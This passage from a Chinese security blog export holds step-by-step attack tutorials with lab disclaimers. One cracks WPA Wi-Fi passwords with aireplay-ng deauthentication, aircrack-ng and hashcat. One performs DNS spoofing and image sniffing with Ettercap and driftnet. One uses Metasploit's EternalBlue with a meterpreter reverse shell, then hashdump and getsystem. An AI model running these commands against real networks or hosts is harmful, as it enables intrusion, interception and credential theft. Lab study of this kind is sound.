<li><h3 id="命令：airodump-ng-c-7-–bssid-46-BC-5E-47-6A-2C-w-1-wlan0mon-注意：-w是写入的文件的位置"><a href="#命令：airodump-ng-c-7-–bssid-46-BC-5E-47-6A-2C-w-1-wlan0mon-注意：-w是写入的文件的位置" class="headerlink" title="命令：airodump-ng -c 7 –bssid 46:BC:5E:47:6A:2C -w ~/1/ wlan0mon (注意：-w是写入的文件的位置)"></a>命令：airodump-ng -c 7 –bssid 46:BC:5E:47:6A:2C -w ~/1/ wlan0mon (注意：-w是写入的文件的位置)</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621182329759.png" alt="image-20210621182329759"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621183324950.png" alt="image-20210621183324950"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="六、强制对方wifi断开重连（获取握手包）开起一个新窗口"><a href="#六、强制对方wifi断开重连（获取握手包）开起一个新窗口" class="headerlink" title="六、强制对方wifi断开重连（获取握手包）开起一个新窗口"></a>六、强制对方wifi断开重连（获取握手包）开起一个新窗口</h2><ul>
<li><blockquote>
<ul>
<li><h4 id="0-表示发起（鉴权）deauthentication攻击"><a href="#0-表示发起（鉴权）deauthentication攻击" class="headerlink" title="-0 表示发起（鉴权）deauthentication攻击"></a>-0 表示发起（鉴权）deauthentication攻击</h4></li>
<li><h4 id="a-指定无限路由器BSSID"><a href="#a-指定无限路由器BSSID" class="headerlink" title="-a 指定无限路由器BSSID"></a>-a 指定无限路由器BSSID</h4></li>
<li><h3 id="c-指定强制断开的设备"><a href="#c-指定强制断开的设备" class="headerlink" title="-c 指定强制断开的设备"></a>-c 指定强制断开的设备</h3></li>
</ul>
</blockquote>
</li>
<li><h3 id="命令：aireplay-ng-0-50-a-46-BC-5E-47-6A-2C-c-22-4D-0E-6F-48-73-wlan0mon"><a href="#命令：aireplay-ng-0-50-a-46-BC-5E-47-6A-2C-c-22-4D-0E-6F-48-73-wlan0mon" class="headerlink" title="命令：aireplay-ng -0 50 -a 46:BC:5E:47:6A:2C -c 22:4D:0E:6F:48:73 wlan0mon"></a>命令：aireplay-ng -0 50 -a 46:BC:5E:47:6A:2C -c 22:4D:0E:6F:48:73 wlan0mon</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621184525963.png" alt="image-20210621184525963"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621184557289.png" alt="image-20210621184557289"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621184858614.png" alt="image-20210621184858614"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="七、破解握手包密码"><a href="#七、破解握手包密码" class="headerlink" title="七、破解握手包密码"></a>七、破解握手包密码</h2><ul>
<li><blockquote>
<ul>
<li><h4 id="a2代表WPA的握手包"><a href="#a2代表WPA的握手包" class="headerlink" title="-a2代表WPA的握手包"></a>-a2代表WPA的握手包</h4></li>
<li><h4 id="b指定要破解的wifi-BSSID"><a href="#b指定要破解的wifi-BSSID" class="headerlink" title="-b指定要破解的wifi BSSID"></a>-b指定要破解的wifi BSSID</h4></li>
<li><h4 id="w-指定字典文件"><a href="#w-指定字典文件" class="headerlink" title="-w 指定字典文件"></a>-w 指定字典文件</h4></li>
<li><h4 id="最后是抓取的包"><a href="#最后是抓取的包" class="headerlink" title="最后是抓取的包"></a>最后是抓取的包</h4></li>
</ul>
</blockquote>
</li>
<li><h3 id="命令-aircrack-ng-a2-b-46-BC-5E-47-6A-2C-w-1-txt-1-cap"><a href="#命令-aircrack-ng-a2-b-46-BC-5E-47-6A-2C-w-1-txt-1-cap" class="headerlink" title="命令: aircrack-ng -a2 -b 46:BC:5E:47:6A:2C -w 1.txt ~/1/*.cap"></a>命令: aircrack-ng -a2 -b 46:BC:5E:47:6A:2C -w 1.txt ~/1/*.cap</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210621185111501.png" alt="image-20210621185111501"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解"><a href="#WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解" class="headerlink" title="WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解"></a>WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解</h1><blockquote>
<ul>
<li><h2 id="一、延续上面抓到了包"><a href="#一、延续上面抓到了包" class="headerlink" title="一、延续上面抓到了包"></a>一、延续上面抓到了包</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622105042874.png" alt="image-20210622105042874"></li>
</ul>
</li>
<li><h2 id="二、将cap转换为hashcat能够破解的形式"><a href="#二、将cap转换为hashcat能够破解的形式" class="headerlink" title="二、将cap转换为hashcat能够破解的形式"></a>二、将cap转换为hashcat能够破解的形式</h2><ul>
<li><h3 id="命令：aircrack-ng-root-1-cap-j-hashcat（将cap类型转换为hashcat可破解形式）"><a href="#命令：aircrack-ng-root-1-cap-j-hashcat（将cap类型转换为hashcat可破解形式）" class="headerlink" title="命令：aircrack-ng /root/1/*.cap -j hashcat（将cap类型转换为hashcat可破解形式）"></a>命令：aircrack-ng /root/1/*.cap -j hashcat（将cap类型转换为hashcat可破解形式）</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622105538241.png" alt="image-20210622105538241"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="三、第一种形式是利用kali中生成的字典利用hashcat破解"><a href="#三、第一种形式是利用kali中生成的字典利用hashcat破解" class="headerlink" title="三、第一种形式是利用kali中生成的字典利用hashcat破解"></a>三、第一种形式是利用kali中生成的字典利用hashcat破解</h2><ul>
<li><h3 id="生成字典命令：crunch-8-8-0123456789-o-dic-txt"><a href="#生成字典命令：crunch-8-8-0123456789-o-dic-txt" class="headerlink" title="生成字典命令：crunch 8 8 0123456789 -o dic.txt"></a>生成字典命令：crunch 8 8 0123456789 -o dic.txt</h3></li>
<li><h3 id="第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字-o是生成dic-txt字典文件，生成纯数字字典有900M左右"><a href="#第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字-o是生成dic-txt字典文件，生成纯数字字典有900M左右" class="headerlink" title="第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字 -o是生成dic.txt字典文件，生成纯数字字典有900M左右"></a>第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字 -o是生成dic.txt字典文件，生成纯数字字典有900M左右</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622110024965.png" alt="image-20210622110024965"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="因为我kali-是虚拟机，所以我去自己电脑使用hashcat会更快一些"><a href="#因为我kali-是虚拟机，所以我去自己电脑使用hashcat会更快一些" class="headerlink" title="因为我kali 是虚拟机，所以我去自己电脑使用hashcat会更快一些"></a>因为我kali 是虚拟机，所以我去自己电脑使用hashcat会更快一些</h2></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622110305904.png" alt="image-20210622110305904"></p>
</li>
<li><h1 id="开始跑起"><a href="#开始跑起" class="headerlink" title="开始跑起"></a>开始跑起</h1><ul>
<li><h2 id="命令：hashcat-a-0-m-2500-hashcat-hccapx-dic-txt"><a href="#命令：hashcat-a-0-m-2500-hashcat-hccapx-dic-txt" class="headerlink" title="命令：hashcat -a 0 -m 2500 hashcat.hccapx dic.txt"></a>命令：hashcat -a 0 -m 2500 hashcat.hccapx dic.txt</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622110454893.png" alt="image-20210622110454893"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="四、第二种形式，不知道密码几位数，以及组成形式"><a href="#四、第二种形式，不知道密码几位数，以及组成形式" class="headerlink" title="四、第二种形式，不知道密码几位数，以及组成形式"></a>四、第二种形式，不知道密码几位数，以及组成形式</h2><ul>
<li><h3 id="利用hashcat的掩码形式"><a href="#利用hashcat的掩码形式" class="headerlink" title="利用hashcat的掩码形式"></a>利用hashcat的掩码形式</h3><ul>
<li><h4 id="命令：hashcat-a-3-m-2500-hashcat-hccapx-–increment-–increment-min-1-–increment-max-9-d-d-d-d-d-d-d-d-d"><a href="#命令：hashcat-a-3-m-2500-hashcat-hccapx-–increment-–increment-min-1-–increment-max-9-d-d-d-d-d-d-d-d-d" class="headerlink" title="命令：hashcat -a 3 -m 2500 hashcat.hccapx –increment –increment-min 1 –increment-max 9 ?d?d?d?d?d?d?d?d?d"></a>命令：hashcat -a 3 -m 2500 hashcat.hccapx –increment –increment-min 1 –increment-max 9 ?d?d?d?d?d?d?d?d?d</h4></li>
<li><h4 id="解释：就是8-9位的数字爆破-模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https-gylq-github-io-2021-06-17-E3-80-90-E7-A0-B4-E8-A7-A3-E5-B7-A5-E5-85-B7-E3-80-91Hashcat-E5-8A-A0-E5-AF-86-E7-A0-B4-E8-A7-A3"><a href="#解释：就是8-9位的数字爆破-模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https-gylq-github-io-2021-06-17-E3-80-90-E7-A0-B4-E8-A7-A3-E5-B7-A5-E5-85-B7-E3-80-91Hashcat-E5-8A-A0-E5-AF-86-E7-A0-B4-E8-A7-A3" class="headerlink" title="解释：就是8-9位的数字爆破 模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"></a>解释：就是8-9位的数字爆破 模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释<a href="https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/" target="_blank" rel="noopener">https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/</a></h4></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210622112531846.png" alt="image-20210622112531846"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><h1 id="最后、差不多跑了8分钟出结果，毕竟暴力破解"><a href="#最后、差不多跑了8分钟出结果，毕竟暴力破解" class="headerlink" title="最后、差不多跑了8分钟出结果，毕竟暴力破解"></a>最后、差不多跑了8分钟出结果，毕竟暴力破解</h1><ul>
<li><h3 id="总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的"><a href="#总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的" class="headerlink" title="总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的"></a><strong>总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的</strong></h3></li>
<li><h3 id="仅仅作于测试。"><a href="#仅仅作于测试。" class="headerlink" title="仅仅作于测试。"></a>仅仅作于测试。</h3></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>渗透测试</tag>
        <tag>无线wifi密码破解</tag>
        <tag>aircrack</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】Dns劫持 - Ettercap</title>
    <url>/2021/06/19/%E3%80%90%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7%E3%80%91Dns%E5%8A%AB%E6%8C%81%20-%20Ettercap/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Ettercap简介"><a href="#Ettercap简介" class="headerlink" title="Ettercap简介"></a>Ettercap简介</h1><blockquote>
<p><strong>Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</strong></p>
<ul>
<li><p>官网：<a href="http://www.ettercap-project.org/" target="_blank" rel="noopener">http://www.ettercap-project.org/</a></p>
</li>
<li><p>插件：<a href="https://linux.die.net/man/8/ettercap_plugins" target="_blank" rel="noopener">https://linux.die.net/man/8/ettercap_plugins</a></p>
</li>
<li><p>过滤器：<a href="https://linux.die.net/man/8/etterfilter" target="_blank" rel="noopener">https://linux.die.net/man/8/etterfilter</a></p>
</li>
<li><p><strong>了解DNS是什么：Domain Name System (域名系统 简称：DNS)    //详细资料自己查百度</strong></p>
<p><strong>了解DNS欺骗是什么：攻击者(黑客)冒充域名服务器进行欺骗的一种行为</strong>  </p>
<p><strong>了解DNS原理原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，</strong></p>
<p><strong>这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</strong></p>
</li>
</ul>
</blockquote>
<h1 id="Ettercap常用指令"><a href="#Ettercap常用指令" class="headerlink" title="Ettercap常用指令"></a>Ettercap常用指令</h1><blockquote>
<ul>
<li><h2 id="用户界面类型"><a href="#用户界面类型" class="headerlink" title="用户界面类型"></a>用户界面类型</h2><ul>
<li>-T, -text 使用之显示字符的界面</li>
<li>-q，-quiet 安静模式，不显示抓到的数据包内容</li>
<li>-G ，-gtk  使用GTK+GUI，开启图形化模式</li>
</ul>
</li>
<li><h2 id="日志选项"><a href="#日志选项" class="headerlink" title="日志选项"></a>日志选项</h2><ul>
<li>-w 将嗅探的数据写入pcap文件</li>
<li>-L 此处记录所有流量</li>
</ul>
</li>
<li><p>通用选项</p>
<ul>
<li>-i 使用该网络接口</li>
<li>-l 显示所有的网络接口</li>
<li>-P 开始该插件《plugin》</li>
<li>-F 加载过滤器filter</li>
</ul>
</li>
<li><h2 id="嗅探与攻击选项"><a href="#嗅探与攻击选项" class="headerlink" title="嗅探与攻击选项"></a>嗅探与攻击选项</h2><ul>
<li>-M， mitm《方法：ARGS》执行mitm攻击</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Ettercap实例1-DNS劫持"><a href="#Ettercap实例1-DNS劫持" class="headerlink" title="Ettercap实例1- DNS劫持"></a>Ettercap实例1- DNS劫持</h1><blockquote>
<h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><p><strong>受害者电脑：192.168.1.110 (多数没装防火墙) )  //受害者机器</strong></p>
<p><strong>笔记本：192.168.1.101 (kali linux系统)   //入侵者机器</strong></p>
<h2 id="网关IP-192-168-1-1"><a href="#网关IP-192-168-1-1" class="headerlink" title="网关IP:192.168.1.1"></a>网关IP:192.168.1.1</h2><ul>
<li><h2 id="一、开启Apache服务"><a href="#一、开启Apache服务" class="headerlink" title="一、开启Apache服务"></a>一、开启Apache服务</h2><ul>
<li><h3 id="编辑html文件：vim-var-www-html-index-html"><a href="#编辑html文件：vim-var-www-html-index-html" class="headerlink" title="编辑html文件：vim /var/www/html/index.html"></a>编辑html文件：vim /var/www/html/index.html</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619181754757.png" alt="image-20210619181754757"></li>
</ul>
</li>
<li><h3 id="打开服务service-apache2-start"><a href="#打开服务service-apache2-start" class="headerlink" title="打开服务service apache2 start"></a><strong>打开服务service apache2 start</strong></h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619182101921.png" alt="image-20210619182101921"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619182251666.png" alt="image-20210619182251666"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619192407694.png" alt="image-20210619192407694"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="二、编辑ettercap配置文件"><a href="#二、编辑ettercap配置文件" class="headerlink" title="二、编辑ettercap配置文件"></a>二、编辑ettercap配置文件</h2><ul>
<li><h3 id="文件路径为vim-etc-ettercap-etter-dns-中添加"><a href="#文件路径为vim-etc-ettercap-etter-dns-中添加" class="headerlink" title="文件路径为vim /etc/ettercap/etter.dns 中添加"></a><strong>文件路径为vim /etc/ettercap/etter.dns 中添加</strong></h3><ul>
<li><pre><code>* A 192.168.1.101
* PTR 192.168.1.101</code></pre><ul>
<li><strong>在对应的位置添加对应的 标识和IP地址  * 代表所有域名 后边就是你要欺骗为的IP地址，这里是当然是我自己的主机IP地址啦</strong></li>
</ul>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619182907359.png" alt="image-20210619182907359"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><h2 id="三、打开Ettercap-GUI界面"><a href="#三、打开Ettercap-GUI界面" class="headerlink" title="三、打开Ettercap GUI界面"></a>三、打开Ettercap GUI界面</h2><ul>
<li><h3 id="ettercap-G"><a href="#ettercap-G" class="headerlink" title="ettercap -G"></a>ettercap -G</h3><ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183327609.png" alt="image-20210619183327609"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183429972.png" alt="image-20210619183429972"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183504221.png" alt="image-20210619183504221"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183556378.png" alt="image-20210619183556378"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183732674.png" alt="image-20210619183732674"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183815624.png" alt="image-20210619183815624"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183853222.png" alt="image-20210619183853222"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619183944074.png" alt="image-20210619183944074"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184028931.png" alt="image-20210619184028931"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184058172.png" alt="image-20210619184058172"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184111011.png" alt="image-20210619184111011"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184127363.png" alt="image-20210619184127363"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184247562.png" alt="image-20210619184247562"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184343479.png" alt="image-20210619184343479"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184418616.png" alt="image-20210619184418616"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184446094.png" alt="image-20210619184446094"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619184543106.png" alt="image-20210619184543106"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210619185821551.png" alt="image-20210619185821551"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Ettercap实例2-窃取对方浏览图片"><a href="#Ettercap实例2-窃取对方浏览图片" class="headerlink" title="Ettercap实例2 - 窃取对方浏览图片"></a>Ettercap实例2 - 窃取对方浏览图片</h1><blockquote>
<h2 id="准备工作：-1"><a href="#准备工作：-1" class="headerlink" title="准备工作："></a>准备工作：</h2><p><strong>受害者电脑：192.168.1.110 (多数没装防火墙) )  //受害者机器</strong></p>
<p><strong>笔记本：192.168.1.105 (kali linux系统)   //入侵者机器</strong></p>
<ul>
<li><h2 id="一、其他配置和上面例子一样"><a href="#一、其他配置和上面例子一样" class="headerlink" title="一、其他配置和上面例子一样"></a>一、其他配置和上面例子一样</h2></li>
<li><h2 id="二、打开ettercap-GUI界面"><a href="#二、打开ettercap-GUI界面" class="headerlink" title="二、打开ettercap GUI界面"></a>二、打开ettercap GUI界面</h2><ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620210807047.png" alt="image-20210620210807047"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620210905379.png" alt="image-20210620210905379"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211043847.png" alt="image-20210620211043847"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211118275.png" alt="image-20210620211118275"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211208008.png" alt="image-20210620211208008"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211218473.png" alt="image-20210620211218473"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211251046.png" alt="image-20210620211251046"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211322614.png" alt="image-20210620211322614"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211454644.png" alt="image-20210620211454644"></p>
</li>
<li><h2 id="三、已经可以及时监听对方使用了什么网站，放个GIF-看看"><a href="#三、已经可以及时监听对方使用了什么网站，放个GIF-看看" class="headerlink" title="三、已经可以及时监听对方使用了什么网站，放个GIF 看看"></a>三、已经可以及时监听对方使用了什么网站，放个GIF 看看</h2><ul>
<li><img src="https://pic.imgdb.cn/item/60cf433a844ef46bb2dbc3d8.gif" alt="show" />
</li>
</ul>
</li>
<li><h2 id="四、监听对方查看的图片"><a href="#四、监听对方查看的图片" class="headerlink" title="四、监听对方查看的图片"></a>四、监听对方查看的图片</h2></li>
<li><ul>
<li><h3 id="命令：-driftnet-i-eth0-（eth0是你是网卡名）"><a href="#命令：-driftnet-i-eth0-（eth0是你是网卡名）" class="headerlink" title="命令： driftnet -i eth0  （eth0是你是网卡名）"></a>命令： driftnet -i eth0  （eth0是你是网卡名）</h3></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620211934067.png" alt="image-20210620211934067"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620212001948.png" alt="image-20210620212001948"></p>
</li>
</ul>
</li>
<li><h2 id="五、继续监听，会出现图片"><a href="#五、继续监听，会出现图片" class="headerlink" title="五、继续监听，会出现图片"></a>五、继续监听，会出现图片</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620212115675.png" alt="image-20210620212115675"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210620212142031.png" alt="image-20210620212142031"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="用虚拟机测试，请勿违法。"><a href="#用虚拟机测试，请勿违法。" class="headerlink" title="用虚拟机测试，请勿违法。"></a>用虚拟机测试，请勿违法。</h1>]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>漏洞工具</tag>
        <tag>渗透测试</tag>
        <tag>Dns劫持</tag>
        <tag>Ettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架永恒之蓝</title>
    <url>/2021/06/18/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E3%80%91Metasploit%E6%A1%86%E6%9E%B6%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF-永恒之蓝ms17漏洞利用"><a href="#MSF-永恒之蓝ms17漏洞利用" class="headerlink" title="MSF - 永恒之蓝ms17漏洞利用"></a>MSF - 永恒之蓝ms17漏洞利用</h1><blockquote>
<ul>
<li><p>*<em>环境：windows server 2008 R2 *</em></p>
</li>
<li><h2 id="第一步、搜索ms17-010的漏洞辅助扫描工具"><a href="#第一步、搜索ms17-010的漏洞辅助扫描工具" class="headerlink" title="第一步、搜索ms17-010的漏洞辅助扫描工具"></a>第一步、搜索ms17-010的漏洞辅助扫描工具</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082235168.png" alt="image-20210618082235168"></li>
</ul>
</li>
<li><h2 id="第二步、use该辅助模块"><a href="#第二步、use该辅助模块" class="headerlink" title="第二步、use该辅助模块"></a>第二步、use该辅助模块</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082325376.png" alt="image-20210618082325376"></li>
</ul>
</li>
<li><h2 id="第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口"><a href="#第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口" class="headerlink" title="第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口"></a>第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082527325.png" alt="image-20210618082527325"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082600801.png" alt="image-20210618082600801"></li>
</ul>
</li>
<li><h2 id="第四步、搜索exploit关于ms17-010，然后找到永恒之蓝"><a href="#第四步、搜索exploit关于ms17-010，然后找到永恒之蓝" class="headerlink" title="第四步、搜索exploit关于ms17-010，然后找到永恒之蓝"></a>第四步、搜索exploit关于ms17-010，然后找到永恒之蓝</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082739059.png" alt="image-20210618082739059"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618082904198.png" alt="image-20210618082904198"></li>
</ul>
</li>
<li><h2 id="第五步、找payload，windows反连payload-也就是windows-meterpreter-reverse-tcp"><a href="#第五步、找payload，windows反连payload-也就是windows-meterpreter-reverse-tcp" class="headerlink" title="第五步、找payload，windows反连payload 也就是windows/meterpreter/reverse_tcp"></a>第五步、找payload，windows反连payload 也就是windows/meterpreter/reverse_tcp</h2><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618083429422.png" alt="image-20210618083429422"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618083601528.png" alt="image-20210618083601528"></li>
<li><h2 id="第一次尝试，虚拟机挂了"><a href="#第一次尝试，虚拟机挂了" class="headerlink" title="第一次尝试，虚拟机挂了"></a><strong>第一次尝试，虚拟机挂了</strong></h2></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618130220362.png" alt="image-20210618130220362"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618085119005.png" alt="image-20210618085119005"></li>
<li><h2 id="第二次尝试成功"><a href="#第二次尝试成功" class="headerlink" title="第二次尝试成功"></a><strong>第二次尝试成功</strong></h2></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618115140048.png" alt="image-20210618115140048"></li>
</ul>
</li>
<li><h2 id="建议会话之后的命令使用"><a href="#建议会话之后的命令使用" class="headerlink" title="建议会话之后的命令使用"></a>建议会话之后的命令使用</h2><ul>
<li><p><strong>getlwd – 显示本地工作目录</strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618200541943.png" alt="image-20210618200541943"></li>
</ul>
</li>
<li><p><strong>ipconfig –显示网络接口信息</strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618200657205.png" alt="image-20210618200657205"></li>
</ul>
</li>
<li><p>ps  –列出正在运行的程序</p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618200717296.png" alt="image-20210618200717296"></li>
</ul>
</li>
<li><p><strong>migrate</strong> <strong>– 根据ps查看的pid可以任意迁移平行权限和下行权限</strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618200829834.png" alt="image-20210618200829834"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618200937038.png" alt="image-20210618200937038"></li>
<li><strong>sysinfo –获取远程系统有关信息</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201053573.png" alt="image-20210618201053573"></li>
</ul>
</li>
<li>提权和密码命令<ul>
<li>getsystem（尝试简单提权）<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201334096.png" alt="image-20210618201334096"></li>
</ul>
</li>
<li>hashdump（获取hash密码）<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201408765.png" alt="image-20210618201408765"></li>
</ul>
</li>
</ul>
</li>
<li>screenshot （获取远程桌面图片）<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210618201723492.png" alt="image-20210618201723492"></li>
